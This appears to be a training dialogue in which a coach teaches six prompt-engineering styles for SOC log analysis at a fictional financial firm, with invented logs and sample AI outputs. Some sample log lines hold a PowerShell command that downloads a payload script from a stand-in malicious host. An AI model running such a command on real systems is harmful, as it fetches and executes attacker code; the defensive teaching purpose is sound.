Your Prompt Engineering Coach will walk you step-by-step through six key prompt engineering styles for SOC automation. At each step:

The Coach will explain the current prompt type and give an example.
You’ll write your own prompt to analyze the logs for that style.
The Coach will give feedback and an example AI response.
Only then will you move to the next style.
Don’t skip; the Coach will keep you on track and redirect any off-topic questions.

## Prompt Engineering Coach

```
Prompt Engineering Coach: Welcome! I am your Prompt Engineering Coach and SOC Analyst. Together, we will work through six prompt engineering styles for these logs, building from basic to highly structured prompts—one step at a time. Please wait for my instructions at each stage, and let’s practice powerful, real-world SOC prompt design! When you are ready type Begin and press Enter.

You: Begin

Prompt Engineering Coach: Great! Let’s start with Step 1: Zero-shot.

Explanation:
A zero-shot prompt is a basic instruction to the AI without any extra context, role, or formatting. It’s just a simple request for action.

Example:
"Analyze the event logs for suspicious activity."

Now it’s your turn! Please provide a zero-shot prompt to ask an AI to analyze some Acme Financial SOC logs. Just use a simple directive, no added role, context, or formatting.

You: Analyze the logs for suspicious activity and identify any potential security incidents.

Prompt Engineering Coach: Excellent!
You’ve created a clear zero-shot prompt. It asks the AI to analyze the logs and look for suspicious activity or incidents, without specifying a role, background, or format.

Feedback:

Clarity: The request is clear—it asks for suspicion and any incidents.
Effectiveness: This should yield general findings but might lack precision because there are no specifics about the use-case or organization.
Sample AI Output:
"After analyzing the logs, I found multiple failed login attempts from external IP addresses and an unusual file transfer late at night. These could indicate brute-force attempts and potential data exfiltration. Further investigation is recommended."

Step 2: System/Role Prompt

Explanation:
With a system/role prompt, you tell the AI to act as a specific persona or expert, which helps guide responses to be more specialized.

Example:
"You are a SOC analyst. Analyze these logs for threats."

Now, please provide a prompt in the system/role style for SOC log analysis at Acme Financial. Remember: assign the AI a role, but you don’t need to add much extra context yet.

You: You are a Tier 2 SOC analyst at Acme Financial. Analyze the provided SOC logs for potential security threats and identify any indicators of compromise.

Prompt Engineering Coach: Well done!
Your prompt clearly establishes the AI’s role ("Tier 2 SOC analyst at Acme Financial") and the task (analyze logs for threats and IOCs). This should result in a more tailored and professional analysis.

Feedback:

Clarity: The role and organization are both specified, helping focus the AI’s responses.
Effectiveness: Requesting indicators of compromise (IOCs) will likely yield more technical, actionable results.
Sample AI Output:
"As a Tier 2 SOC analyst at Acme Financial, I reviewed the provided SOC logs. I identified multiple failed login attempts from a foreign IP, privilege escalation on one host, and unexpected outbound connections to an unfamiliar domain. These are strong indicators of a potential compromise and should be investigated further."

Step 3: Role Plus Context Prompt

Explanation:
Now, you’ll give the AI both a specific role and some situational context (for example, type of business, time period, or specific threat concerns).

Example:
"You are a SOC analyst at a financial institution. Analyze these logs for evidence of coordinated weekend attacks."

Please create a prompt in this style: give a role, a bit more context (such as time window, asset type, or threat focus), and a clear task for SOC analysis at Acme Financial.

You: You are a Senior SOC analyst at Acme Financial, a financial services company that handles sensitive customer and transaction data. The following logs were collected between 09:00 and 09:30 on October 30, 2025, from critical assets including a Windows server, database server, firewall gateway, and application server. Analyze these logs for signs of brute-force attempts, data exfiltration, command-and-control activity, or malicious script execution, and determine whether these events indicate a coordinated attack.

Prompt Engineering Coach: Excellent work!
Your prompt sets a detailed role (Senior SOC analyst), provides organization and data type context, specifies log timeframe and sources, and outlines exactly which threats to look for. This will focus the AI’s analysis very well.

Feedback:

Clarity: Context is specific and actionable, including date, time, systems, and threat types.
Effectiveness: This will help an AI (or analyst) provide highly relevant findings, reducing ambiguity.
Minor note: Even more clarity could be added by specifying what format of analysis you want—but that’s for the next step!
Sample AI Output:
"As a Senior SOC analyst at Acme Financial reviewing logs from 09:00–09:30 on October 30, 2025, from critical assets, I detected the following:

Brute-force attempts: Repeated failed logins from IP 45.67.89.101 targeting the Windows server suggest possible brute-force activity.
Data exfiltration: The application server initiated large outbound transfers to an unusual external host, potentially indicating data exfiltration.
C2 activity: Beacon-like traffic patterns from the database server to a suspicious domain mimic known command-and-control activity.
Malicious scripts: Firewall logs show multiple blocked PowerShell scripts attempting to run on the Windows server.
The timing and coordination of these events suggest a likely coordinated attack targeting core infrastructure. Immediate containment and further investigation are advised."

Step 4: Template/Format Prompt

Explanation:
In this style, you instruct the AI both on what to do and exactly how to format its answer (such as a table, list, or JSON). This increases clarity and makes the output easier to interpret or automate.

Example:
"You are a SOC analyst at a financial institution. Analyze the logs and provide your findings in a table with these columns: Event, Description, Severity, System."

Please write a prompt in this template/format style for a SOC log analysis. Make sure to include both the role/context and a specific format for the results.

You: You are a Senior SOC analyst at Acme Financial reviewing security logs from October 30, 2025 (09:00–09:30) across critical assets including WIN-SRV-02, DB-SRV-01, FW-GW-01, and APP-SRV-03. Analyze the logs for evidence of brute-force attempts, data exfiltration, command-and-control communication, and malicious script execution.

Present your findings in a structured table with the following columns:

Timestamp

Affected System

Suspicious Activity Type

Description of Event

Potential Impact

Severity (Low/Medium/High/Critical)

Recommended Immediate Action

After the table, include a brief executive summary (3–5 sentences) stating whether the activity appears isolated or coordinated and why.

Prompt Engineering Coach: Outstanding!
Your prompt specifies the role, detailed context, specific threats to consider, and requires a highly structured table plus an executive summary. This template/format prompt gives clear structure and setting, making analysis systematic and easy to review.

Feedback:

Clarity: Requiring specific columns encourages comprehensive results that are easy to parse or report.
Effectiveness: Executive summary ensures the AI synthesizes the findings.
Suggestion: This level of structure is ideal for both human review and automated workflows.
Sample AI Output:

Timestamp	Affected System	Suspicious Activity Type	Description of Event	Potential Impact	Severity	Recommended Immediate Action
09:05	WIN-SRV-02	Brute-Force Attempt	50+ failed login attempts from 203.0.113.12	Account compromise	High	Block IP, check for successful logins
09:12	FW-GW-01	C2 Communication	Beaconing to suspicious domain (evil.example.com)	Malware infection	Critical	Isolate system, investigate malware
09:18	APP-SRV-03	Data Exfiltration	Large outbound data transfer to unknown IP	Data loss	Critical	Block transfer, inspect data sent
09:25	WIN-SRV-02	Malicious Script	Blocked PowerShell script attempting privilege escalation	Privilege escalation	High	Investigate script origin
Executive Summary:
The security events observed between 09:00 and 09:30 on October 30, 2025, suggest coordinated malicious activity across multiple critical assets. The combination of brute-force attempts, command-and-control communication, and data exfiltration aligns with tactics used in orchestrated attacks. These events occurred close together in time and targeted more than one system, indicating they are likely not isolated incidents. Immediate incident response is recommended to contain and investigate the threat.

Step 5: One-Shot Prompt

Explanation:
A one-shot prompt provides the AI with a single real or sample example (input + expected output) before asking it to process your actual request. This helps demonstrate how you want the response to look or what you expect.

Example:
Example:
Input: "5 failed admin logins from IP 1.2.3.4"
Output: "Brute-force login attempt detected — Severity: Medium."

Now, please write your own one-shot prompt for Acme Financial SOC log analysis:

Give a sample input and output, then ask the AI to analyze a new set of logs in the same way.
You: You are a Senior SOC analyst at Acme Financial. Analyze SOC logs for suspicious activity and classify each event with a short description and a severity rating (Low/Medium/High/Critical).

Example:

Input Log: [2025-10-29 22:14:03] [WEB-SRV-01] 12 failed login attempts for user 'admin' from IP 203.0.113.55

Expected Output: Brute-force login attempt detected on WEB-SRV-01 from IP 203.0.113.55 targeting account 'admin'. Severity: High

Now analyze the following logs using the same format (brief description followed by a severity rating):

[2025-10-30 09:12:44] [WIN-SRV-02] Failed login attempt for user 'admin' from IP 185.210.94.11 [2025-10-30 09:15:08] [WIN-SRV-02] 5 consecutive failed login attempts detected from IP 185.210.94.11 [2025-10-30 09:25:16] [DB-SRV-01] Large data transfer (2.5GB) to external IP 92.43.212.5 over port 443 [2025-10-30 09:26:45] [FW-GW-01] Outbound connection to blacklisted IP 185.210.94.11 blocked [2025-10-30 09:28:02] [APP-SRV-03] Suspicious PowerShell command executed: "Invoke-WebRequest -Uri http://malicious.site/payload.ps1 "

Prompt Engineering Coach: Outstanding!
Your one-shot prompt follows the ideal structure: you give a sample log entry, how you want it described, assign a severity, and then present new logs for identical analysis. This guides the AI to model your format and demonstrates how events should be assessed.

Feedback:

Clarity: Clear sample ensures the AI knows both style and substance you expect.
Effectiveness: Strong for consistency, especially with multiple log entries.
Small suggestion: If you want further consistency, you might specify that the output be kept to no more than two sentences per finding.
Sample AI Output:

Failed login attempt for user 'admin' on WIN-SRV-02 from IP 185.210.94.11.
Severity: Medium

Multiple consecutive failed logins detected from IP 185.210.94.11 targeting WIN-SRV-02, possible brute-force attempt.
Severity: High

Large outbound data transfer (2.5GB) from DB-SRV-01 to external IP 92.43.212.5 over port 443 indicates potential data exfiltration.
Severity: Critical

Outbound connection attempt to blacklisted IP 185.210.94.11 from FW-GW-01 was blocked, possible malicious communication.
Severity: High

Suspicious PowerShell command executed on APP-SRV-03, possible malware payload download attempt.
Severity: Critical

Step 6: Multi-Shot Prompt

Explanation:
A multi-shot prompt provides two or more input/output examples before asking the AI to perform new analysis. This helps the model generalize accurately for more complex tasks or varied patterns.

Example:
Example 1:
Input: "Suspicious PowerShell command"
Output: "Possible malware execution detected. Severity: High."

Example 2:
Input: "Outbound to blacklisted IP blocked"
Output: "Malicious outbound connection attempt blocked. Severity: Critical."

Now, please write a multi-shot prompt for Acme Financial SOC analysis:

Show two (or more) input/output examples, then present new logs and request responses in the same style.
You: You are a Senior SOC analyst at Acme Financial. Analyze SOC logs and respond with:

A concise description of the security event

The likely threat category

A severity rating (Low / Medium / High / Critical)

Keep each response to no more than two sentences.

Example 1:

Input Log: [2025-10-28 14:03:11] [WEB-SRV-02] Suspicious PowerShell command executed: "EncodedCommand aW52b2tl..."

Output: Suspicious encoded PowerShell execution detected on WEB-SRV-02, possibly indicating malware or attacker post-exploitation activity. Threat Category: Malicious Script Execution Severity: High

Example 2:

Input Log: [2025-10-28 14:05:47] [FW-GW-01] Outbound connection to blacklisted IP 198.51.100.77 blocked

Output: Firewall blocked outbound communication attempt to a known blacklisted IP, suggesting potential command-and-control activity. Threat Category: Command-and-Control Communication Severity: Critical

Now analyze the following logs using the same structure and style:

[2025-10-30 09:12:44] [WIN-SRV-02] Failed login attempt for user 'admin' from IP 185.210.94.11 [2025-10-30 09:15:08] [WIN-SRV-02] 5 consecutive failed login attempts detected from IP 185.210.94.11 [2025-10-30 09:25:16] [DB-SRV-01] Large data transfer (2.5GB) to external IP 92.43.212.5 over port 443 [2025-10-30 09:26:45] [FW-GW-01] Outbound connection to blacklisted IP 185.210.94.11 blocked [2025-10-30 09:28:02] [APP-SRV-03] Suspicious PowerShell command executed: "Invoke-WebRequest -Uri http://malicious.site/payload.ps1 "

Prompt Engineering Coach: Fantastic!
You’ve constructed a thorough multi-shot prompt with two diverse examples, instructing the AI to provide a concise description, threat category, and severity rating. The expectation on style and response structure is very clear.

Feedback:

Clarity: The requirements and answer format are precise, reinforcing how each output should look.
Effectiveness: This is exemplary for complex SOC automation or training AI—each event is contextualized and categorized.
Sample AI Output:

Single failed login attempt for 'admin' on WIN-SRV-02 from IP 185.210.94.11.
Threat Category: Brute-Force Attempt
Severity: Medium

Five consecutive failed login attempts from IP 185.210.94.11 on WIN-SRV-02 indicate a possible brute-force attack underway.
Threat Category: Brute-Force Attempt
Severity: High

Large outbound transfer of 2.5GB from DB-SRV-01 to an external IP suggests potential unauthorized data exfiltration.
Threat Category: Data Exfiltration
Severity: Critical

Outbound connection attempt to blacklisted IP 185.210.94.11 was blocked by FW-GW-01, indicating likely command-and-control communication.
Threat Category: Command-and-Control Communication
Severity: Critical

APP-SRV-03 executed a suspicious PowerShell command attempting to download a payload, indicating a possible malware infection attempt.
Threat Category: Malicious Script Execution
Severity: Critical
